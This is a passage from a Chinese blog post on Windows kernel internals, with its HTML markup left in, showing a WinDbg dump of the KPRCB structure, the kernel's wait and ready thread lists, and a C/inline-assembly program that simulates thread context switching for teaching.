number">0x012</span> BuildType        <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x014</span> SetMember        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x018</span> CpuType          <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x019</span> CpuID            <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x01a</span> CpuStep          <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x01c</span> ProcessorState   <span class="token operator">:</span> _KPROCESSOR_STATE   <span class="token operator">+</span><span class="token number">0x33c</span> KernelReserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x37c</span> HalReserved      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x3bc</span> PrcbPad0         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">92</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x418</span> LockQueue        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> _KSPIN_LOCK_QUEUE   <span class="token operator">+</span><span class="token number">0x498</span> PrcbPad1         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x4a0</span> NpxThread        <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x4a4</span> InterruptCount   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4a8</span> KernelTime       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4ac</span> UserTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b0</span> DpcTime          <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b4</span> DebugDpcTime     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b8</span> InterruptTime    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4bc</span> AdjustDpcThreshold <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c0</span> PageColor        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c4</span> SkipTick         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c8</span> MultiThreadSetBusy <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x4c9</span> Spare2           <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x4cc</span> ParentNode       <span class="token operator">:</span> Ptr32 _KNODE   <span class="token operator">+</span><span class="token number">0x4d0</span> MultiThreadProcessorSet <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4d4</span> MultiThreadSetMaster <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x4d8</span> ThreadStartCount <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e0</span> CcFastReadNoWait <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e4</span> CcFastReadWait   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e8</span> CcFastReadNotPossible <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4ec</span> CcCopyReadNoWait <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f0</span> CcCopyReadWait   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f4</span> CcCopyReadNoWaitMiss <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f8</span> KeAlignmentFixupCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4fc</span> KeContextSwitches <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x500</span> KeDcacheFlushCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x504</span> KeExceptionDispatchCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x508</span> KeFirstLevelTbFills <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x50c</span> KeFloatingEmulationCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x510</span> KeIcacheFlushCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x514</span> KeSecondLevelTbFills <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x518</span> KeSystemCalls    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x51c</span> SpareCounter0    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x520</span> PPLookasideList  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x5a0</span> PPNPagedLookasideList <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x6a0</span> PPPagedLookasideList <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x7a0</span> PacketBarrier    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7a4</span> ReverseStall     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7a8</span> IpiFrame         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x7ac</span> PrcbPad2         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x7e0</span> CurrentPacket    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x7ec</span> TargetSet        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7f0</span> WorkerRoutine    <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x7f4</span> IpiFrozen        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7f8</span> PrcbPad3         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x820</span> RequestSummary   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x824</span> SignalDone       <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x828</span> PrcbPad4         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x860</span> DpcListHead      <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x868</span> DpcStack         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x86c</span> DpcCount         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x870</span> DpcQueueDepth    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x874</span> DpcRoutineActive <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x878</span> DpcInterruptRequested <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x87c</span> DpcLastCount     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x880</span> DpcRequestRate   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x884</span> MaximumDpcQueueDepth <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x888</span> MinimumDpcRate   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x88c</span> QuantumEnd       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x890</span> PrcbPad5         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x8a0</span> DpcLock          <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x8a4</span> PrcbPad6         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x8c0</span> CallDpc          <span class="token operator">:</span> _KDPC   <span class="token operator">+</span><span class="token number">0x8e0</span> ChainedInterruptList <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x8e4</span> LookasideIrpFloat <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x8e8</span> SpareFields0     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x900</span> VendorString     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x90d</span> InitialApicId    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x90e</span> LogicalProcessorsPerPhysicalProcessor <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x910</span> MHz              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x914</span> FeatureBits      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x918</span> UpdateSignature  <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x920</span> NpxSaveArea      <span class="token operator">:</span> _FX_SAVE_AREA   <span class="token operator">+</span><span class="token number">0xb30</span> PowerState       <span class="token operator">:</span> _PROCESSOR_POWER_STATE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>CurrentThread：指向当前线程；</li><li>NextThread：指向即将切换的下一个进程；</li><li>IdleThread：指向空闲的进程；</li></ul><h2 id="2-线程切换"><a href="#2-线程切换" class="headerlink" title="2 线程切换"></a>2 线程切换</h2><p>操作系统中的线程有三种状态：就绪、等待和运行。<br>正在运行的线程保存在KPCR中，就绪和等待的线程保存在对应的链表中。</p><h3 id="2-1-等待链表"><a href="#2-1-等待链表" class="headerlink" title="2.1 等待链表"></a>2.1 等待链表</h3><p>一个双向链表，当线程调用了 Sleep() 或者 WaitForSingleObject() 等函数时，就挂到这个链表。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dd KiWaitListHead l2<span class="token number">80553</span>d88  <span class="token number">82016e08</span> <span class="token number">82018e08</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-2-就绪链表"><a href="#2-2-就绪链表" class="headerlink" title="2.2 就绪链表"></a>2.2 就绪链表</h3><p>由32个双向链表组成，下标表示线程运行级别。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dd KiDispatcherReadyListHead l40<span class="token number">80554820</span>  <span class="token number">80554820</span> <span class="token number">80554820</span> <span class="token number">80554828</span> <span class="token number">80554828</span><span class="token number">80554830</span>  <span class="token number">80554830</span> <span class="token number">80554830</span> <span class="token number">80554838</span> <span class="token number">80554838</span><span class="token number">80554840</span>  <span class="token number">80554840</span> <span class="token number">80554840</span> <span class="token number">80554848</span> <span class="token number">80554848</span><span class="token number">80554850</span>  <span class="token number">80554850</span> <span class="token number">80554850</span> <span class="token number">80554858</span> <span class="token number">80554858</span><span class="token number">80554860</span>  <span class="token number">80554860</span> <span class="token number">80554860</span> <span class="token number">80554868</span> <span class="token number">80554868</span><span class="token number">80554870</span>  <span class="token number">80554870</span> <span class="token number">80554870</span> <span class="token number">80554878</span> <span class="token number">80554878</span><span class="token number">80554880</span>  <span class="token number">80554880</span> <span class="token number">80554880</span> <span class="token number">80554888</span> <span class="token number">80554888</span><span class="token number">80554890</span>  <span class="token number">80554890</span> <span class="token number">80554890</span> <span class="token number">80554898</span> <span class="token number">80554898</span><span class="token number">805548</span>a0  <span class="token number">805548</span>a0 <span class="token number">805548</span>a0 <span class="token number">805548</span>a8 <span class="token number">805548</span>a8<span class="token number">805548</span>b0  <span class="token number">805548</span>b0 <span class="token number">805548</span>b0 <span class="token number">805548</span>b8 <span class="token number">805548</span>b8<span class="token number">805548</span>c0  <span class="token number">805548</span>c0 <span class="token number">805548</span>c0 <span class="token number">805548</span>c8 <span class="token number">805548</span>c8<span class="token number">805548</span>d0  <span class="token number">805548</span>d0 <span class="token number">805548</span>d0 <span class="token number">805548</span>d8 <span class="token number">805548</span>d8<span class="token number">805548e0</span>  <span class="token number">805548e0</span> <span class="token number">805548e0</span> <span class="token number">805548e8</span> <span class="token number">805548e8</span><span class="token number">805548f</span><span class="token number">0</span>  <span class="token number">805548f</span><span class="token number">0</span> <span class="token number">805548f</span><span class="token number">0</span> <span class="token number">805548f</span><span class="token number">8</span> <span class="token number">805548f</span><span class="token number">8</span><span class="token number">80554900</span>  <span class="token number">80554900</span> <span class="token number">80554900</span> <span class="token number">80554908</span> <span class="token number">80554908</span><span class="token number">80554910</span>  <span class="token number">80554910</span> <span class="token number">80554910</span> <span class="token number">80554918</span> <span class="token number">80554918</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-模拟线程切换"><a href="#2-3-模拟线程切换" class="headerlink" title="2.3 模拟线程切换"></a>2.3 模拟线程切换</h3><p><img src="/images/4-1.png" alt="4-1"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"StdAfx.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ThreadSwitch.h"</span></span><span class="token comment">//定义线程栈的大小</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GMTHREADSTACKSIZE</span> <span class="token expression"><span class="token number">0x80000</span></span></span><span class="token comment">//当前线程的索引</span><span class="token keyword">int</span> CurrentThreadIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//线程的列表</span>GMThread_t GMThreadList<span class="token punctuation">[</span>MAXGMTHREAD<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//线程状态的标志</span><span class="token keyword">enum</span> <span class="token class-name">FLAGS</span><span class="token punctuation">&#123;</span> GMTHREAD_CREATE <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">,</span> GMTHREAD_READY <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">,</span> GMTHREAD_SLEEP <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">,</span> GMTHREAD_EXIT <span class="token operator">=</span> <span class="token number">0x8</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//启动线程的函数</span><span class="token keyword">void</span> <span class="token function">GMThreadStartup</span><span class="token punctuation">(</span>GMThread_t<span class="token operator">*</span> GMThreadp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> GMThreadp<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span>GMThreadp<span class="token operator">-></span>lpParameter<span class="token punctuation">)</span><span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>Flags <span class="token operator">=</span> GMTHREAD_EXIT<span class="token punctuation">;</span> <span class="token function">Scheduling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//空闲线程的函数</span><span class="token keyword">void</span> <span class="token function">IdleGMThread</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> lpParameter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"IdleGMThread---------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Scheduling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//向栈中压入一个uint值</span><span class="token keyword">void</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span> Stackpp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">*</span>Stackpp <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token operator">*</span>Stackpp <span class="token operator">=</span> v<span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//初始化线程的信息</span><span class="token keyword">void</span> <span class="token function">InitGMThread</span><span class="token punctuation">(</span>GMThread_t<span class="token operator">*</span> GMThreadp<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> lpParameter<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> lpParameter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> StackPages<span class="token punctuation">;</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> StackDWordParam<span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>Flags <span class="token operator">=</span> GMTHREAD_CREATE<span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>func <span class="token operator">=</span> func<span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>lpParameter <span class="token operator">=</span> lpParameter<span class="token punctuation">;</span> StackPages <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> GMTHREADSTACKSIZE<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">ZeroMemory</span><span class="token punctuation">(</span>StackPages<span class="token punctuation">,</span> GMTHREADSTACKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>initialStack <span class="token operator">=</span> StackPages <span class="token operator">+</span> GMTHREADSTACKSIZE<span class="token punctuation">;</span> StackDWordParam <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>GMThreadp<span class="token operator">-></span>initialStack<span class="token punctuation">;</span> <span class="token comment">//入栈</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>GMThreadp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//startup 函数所需要的参数</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//你好奇这里为什么放0，简单来说是为了平衡堆栈，其次是因为调用startup是要参数的，pop startup->eip后 esp也就是这里，进函数后会把mov ebp,esp  然后ebp+8 就是函数默认的参数位置，这也就是这里为什么多push一个四字节。</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>GMThreadStartup<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">PushStack</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StackDWordParam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//当前线程的栈顶</span> GMThreadp<span class="token operator">-></span>KernelStack <span class="token operator">=</span> StackDWordParam<span class="token punctuation">;</span> GMThreadp<span class="token operator">-></span>Flags <span class="token operator">=</span> GMTHREAD_READY<span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//将一个函数注册为单独线程执行</span><span class="token keyword">int</span> <span class="token function">RegisterGMThread</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span>lpParameter<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> lpParameter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token function">_stricmp</span><span class="token punctuation">(</span>GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token function">initGMThread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> func<span class="token punctuation">,</span> lpParameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x55AA0000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//切换线程</span><span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">SwitchContext</span><span class="token punctuation">(</span>GMThread_t<span class="token operator">*</span> SrcGMThreadp<span class="token punctuation">,</span> GMThread_t<span class="token operator">*</span> DstGMThreadp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> __asm <span class="token punctuation">&#123;</span>  push ebp  mov ebp<span class="token punctuation">,</span> esp  push edi  push esi  push ebx  push ecx  push edx  push eax     mov esi<span class="token punctuation">,</span> SrcGMThreadp  mov edi<span class="token punctuation">,</span> DstGMThreadp  mov <span class="token punctuation">[</span>esi<span class="token operator">+</span>GMThread_t<span class="token punctuation">.</span>KernelStack<span class="token punctuation">]</span><span class="token punctuation">,</span> esp  <span class="token comment">//经典线程切换，另外一个线程复活</span>  mov esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>edi<span class="token operator">+</span>GMThread_t<span class="token punctuation">.</span>KernelStack<span class="token punctuation">]</span>  pop eax  <span class="token comment">//esp在上面已经切换到新的线程栈中，这个栈再pop eax，拿到的就是保存的esp(初始化的esp/运行时esp)</span>  pop edx  pop ecx  pop ebx  pop esi  pop edi  pop ebp  ret   <span class="token comment">//把栈顶的值弹到eip中，在这里弹出的就是startup的地址到eip中</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//这个函数会让出cpu，从队列里重新选择一个线程执行</span><span class="token keyword">void</span> <span class="token function">Scheduling</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">int</span> TickCount<span class="token punctuation">;</span> GMThread_t<span class="token operator">*</span> SrcGMThreadp<span class="token punctuation">;</span> GMThread_t<span class="token operator">*</span> DstGMThreadp<span class="token punctuation">;</span> TickCount <span class="token operator">=</span> <span class="token function">GetTickCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> SrcGMThreadp <span class="token operator">=</span> <span class="token operator">&amp;</span>GMThreadList<span class="token punctuation">[</span>CurrentThreadIndex<span class="token punctuation">]</span><span class="token punctuation">;</span> DstGMThreadp <span class="token operator">=</span> <span class="token operator">&amp;</span>GMThreadList<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Flags <span class="token operator">&amp;</span> GMTHREAD_SLEEP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>TickCount <span class="token operator">></span> GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SleepMillsecondDot<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Flags <span class="token operator">=</span> GMTHREAD_READY<span class="token 